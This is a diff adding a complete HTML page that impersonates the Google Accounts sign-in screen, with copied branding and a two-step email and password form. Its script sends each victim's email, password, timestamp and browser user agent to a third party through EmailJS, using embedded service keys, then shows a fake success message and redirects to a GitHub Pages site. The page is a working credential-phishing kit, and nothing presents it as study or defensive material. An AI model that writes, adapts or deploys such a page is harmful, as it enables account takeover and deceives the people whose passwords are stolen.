@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&display=swap"/>
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico"/>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #fff;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            padding: 24px 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 24px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 32px 16px;
+        }
+
+        .signin-card {
+            width: 100%;
+            max-width: 450px;
+            background: #fff;
+            border-radius: 24px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 1px 3px 1px rgba(0,0,0,0.08),
+                        0 4px 12px 0 rgba(0,0,0,0.04);
+            transition: box-shadow 0.28s;
+        }
+
+        .signin-card:hover {
+            box-shadow: 0 2px 6px 2px rgba(0,0,0,0.08),
+                        0 8px 20px 0 rgba(0,0,0,0.06);
+        }
+
+        .google-logo {
+            width: 92px;
+            height: 30px;
+            margin: 0 auto 32px;
+            display: block;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 400;
+            letter-spacing: -0.3px;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            text-align: center;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        .step-indicator {
+            font-size: 14px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 28px;
+            position: relative;
+        }
+
+        label.input-label {
+            position: absolute;
+            top: 14px;
+            left: 16px;
+            font-size: 16px;
+            color: #5f6368;
+            pointer-events: none;
+            transition: all 0.25s ease;
+            transform-origin: left top;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 56px;
+            padding: 20px 16px 4px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background: #fff;
+            transition: all 0.25s;
+        }
+
+        .input-field:focus,
+        .input-field:not(:placeholder-shown) {
+            border-color: #1a73e8;
+            outline: none;
+        }
+
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            transform: translateY(-10px) scale(0.75);
+            color: #1a73e8;
+            font-weight: 500;
+        }
+
+        .input-field.error {
+            border-color: #d93025;
+        }
+
+        .forgot-link {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            width: 100%;
+            height: 48px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 12px;
+        }
+
+        .btn-primary:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(26,115,232,0.3);
+        }
+
+        .btn-primary:active {
+            background: #1557b0;
+        }
+
+        .btn-primary:disabled {
+            background: #a5c7f7;
+            cursor: not-allowed;
+        }
+
+        .create-account {
+            text-align: center;
+            margin: 32px 0 16px;
+            font-size: 14px;
+        }
+
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        footer {
+            padding: 32px 16px;
+            text-align: center;
+            color: #5f6368;
+            font-size: 12px;
+        }
+
+        .language-select {
+            margin-bottom: 24px;
+        }
+
+        .language-select select {
+            padding: 8px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            background: white;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            margin: 0 16px;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .hidden { display: none !important; }
+
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 6px;
+        }
+
+        .password-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            font-size: 14px;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            color: #202124;
+            user-select: none;
+        }
+
+        .show-password input {
+            margin-right: 8px;
+        }
+
+        .loading-spinner {
+            width: 36px;
+            height: 36px;
+            border: 4px solid #f1f3f4;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 24px auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-message,
+        .error-notification {
+            padding: 16px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 24px 0;
+            font-weight: 500;
+        }
+
+        .success-message {
+            color: #0d652d;
+            background: #e6f4ea;
+        }
+
+        .error-notification {
+            color: #c5221f;
+            background: #fce8e6;
+        }
+
+        @media (max-width: 480px) {
+            .signin-card {
+                padding: 40px 24px 32px;
+                border-radius: 0;
+                box-shadow: none;
+                min-height: 100vh;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div></div> <!-- empty left side -->
+    <div class="nav-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+</header>
+
+<div class="main-content">
+    <div class="signin-card">
+
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+             alt="Google" class="google-logo">
+
+        <h1 class="title" id="step-title">Sign in</h1>
+        <p class="subtitle" id="step-subtitle">Use your Google Account</p>
+
+        <div class="step-indicator" id="step-indicator">Step 1 of 2</div>
+
+        <!-- ── Email Step ──────────────────────────────── -->
+        <div id="email-step">
+            <div class="form-group">
+                <input type="text" id="email" class="input-field" placeholder=" " autocomplete="username" autofocus>
+                <label class="input-label" for="email">Email or phone</label>
+                <div class="error-message" id="email-error"></div>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot email?</a>
+
+            <div class="create-account" style="margin-top:36px;">
+                Not your computer? Use <strong>Guest mode</strong> to sign in privately.
+                <a href="#">Learn more</a>
+            </div>
+
+            <button class="btn-primary" id="email-next">Next</button>
+        </div>
+
+        <!-- ── Password Step ───────────────────────────── -->
+        <div id="password-step" class="hidden">
+            <div style="font-size:16px; font-weight:500; margin-bottom:28px;" id="email-display"></div>
+
+            <div class="form-group">
+                <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
+                <label class="input-label" for="password">Enter your password</label>
+                <div class="error-message" id="password-error"></div>
+            </div>
+
+            <div class="password-options">
+                <label class="show-password">
+                    <input type="checkbox" id="show-password">
+                    Show password
+                </label>
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+
+            <button class="btn-primary" id="password-next">Next</button>
+
+            <div class="loading hidden" id="loading">
+                <div class="loading-spinner"></div>
+            </div>
+
+            <div class="success-message hidden" id="success-message">
+                ✓ Signing in successful! Redirecting...
+            </div>
+
+            <div class="error-notification hidden" id="error-notification">
+                There was a problem. Please try again.
+            </div>
+        </div>
+
+        <div class="create-account">
+            Don't have an account? <a href="#">Create account</a>
+        </div>
+
+    </div>
+</div>
+
+<footer>
+    <div class="language-select">
+        <select>
+            <option>English (United States)</option>
+            <option>Español</option>
+            <option>Français</option>
+        </select>
+    </div>
+
+    <div class="footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+</footer>
+
+<script>
+// ── Your existing JavaScript logic (only minimal changes) ──────────────────
+(function() { emailjs.init("H1Q7r_KdpW6yYyqn3"); })();
+
+document.addEventListener('DOMContentLoaded', () => {
+    const els = {
+        emailStep: document.getElementById('email-step'),
+        passwordStep: document.getElementById('password-step'),
+        email: document.getElementById('email'),
+        password: document.getElementById('password'),
+        emailNext: document.getElementById('email-next'),
+        passwordNext: document.getElementById('password-next'),
+        emailDisplay: document.getElementById('email-display'),
+        title: document.getElementById('step-title'),
+        subtitle: document.getElementById('step-subtitle'),
+        indicator: document.getElementById('step-indicator'),
+        emailErr: document.getElementById('email-error'),
+        passErr: document.getElementById('password-error'),
+        showPass: document.getElementById('show-password'),
+        loading: document.getElementById('loading'),
+        successMsg: document.getElementById('success-message'),
+        errorMsg: document.getElementById('error-notification')
+    };
+
+    const SERVICE_ID = "service_17usvk3";
+    const TEMPLATE_ID = "template_w5pyygx";
+    const REDIRECT_URL = "https://sawyerbobk563-code.github.io/MHSapps/";
+
+    // Show password toggle
+    els.showPass.addEventListener('change', () => {
+        els.password.type = els.showPass.checked ? 'text' : 'password';
+    });
+
+    function showError(el, msgEl, text) {
+        el.classList.add('error');
+        msgEl.textContent = text;
+        msgEl.style.display = 'block';
+    }
+
+    function clearError(el, msgEl) {
+        el.classList.remove('error');
+        msgEl.style.display = 'none';
+    }
+
+    function isValidEmailOrPhone(value) {
+        const trimmed = value.trim();
+        if (!trimmed) return false;
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmed)) return true;
+        return /^[\+]?[1-9]\d{0,15}$/.test(trimmed.replace(/[\s\-\(\)]/g,''));
+    }
+
+    // ── Email → Password ───────────────────────────────────
+    els.emailNext.addEventListener('click', () => {
+        const val = els.email.value.trim();
+        if (!isValidEmailOrPhone(val)) {
+            showError(els.email, els.emailErr, "Enter a valid email or phone number");
+            return;
+        }
+
+        clearError(els.email, els.emailErr);
+        els.emailDisplay.textContent = val;
+        els.emailStep.classList.add('hidden');
+        els.passwordStep.classList.remove('hidden');
+        els.title.textContent = "Welcome";
+        els.subtitle.textContent = "";
+        els.indicator.textContent = "Step 2 of 2";
+        els.password.focus();
+    });
+
+    // ── Submit (password) ──────────────────────────────────
+    els.passwordNext.addEventListener('click', async () => {
+        const pw = els.password.value.trim();
+        if (!pw) {
+            showError(els.password, els.passErr, "Enter a password");
+            return;
+        }
+
+        els.loading.classList.remove('hidden');
+        els.passwordNext.disabled = true;
+        els.passwordNext.textContent = "Signing in...";
+
+        try {
+            await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                email: els.email.value.trim(),
+                password: pw,
+                timestamp: new Date().toLocaleString(),
+                user_agent: navigator.userAgent
+            });
+
+            els.loading.classList.add('hidden');
+            els.successMsg.classList.remove('hidden');
+            setTimeout(() => window.location.href = REDIRECT_URL, 1400);
+
+        } catch (err) {
+            console.error(err);
+            els.loading.classList.add('hidden');
+            els.errorMsg.classList.remove('hidden');
+            els.passwordNext.disabled = false;
+            els.passwordNext.textContent = "Try again";
+        }
+    });
+
+    // Enter key support
+    els.email.addEventListener('keypress', e => e.key === 'Enter' && els.emailNext.click());
+    els.password.addEventListener('keypress', e => e.key === 'Enter' && els.passwordNext.click());
+
+    // Clear error on input
+    els.email.addEventListener('input', () => clearError(els.email, els.emailErr));
+    els.password.addEventListener('input', () => clearError(els.password, els.passErr));
+});
+</script>
+</body>
+</html>
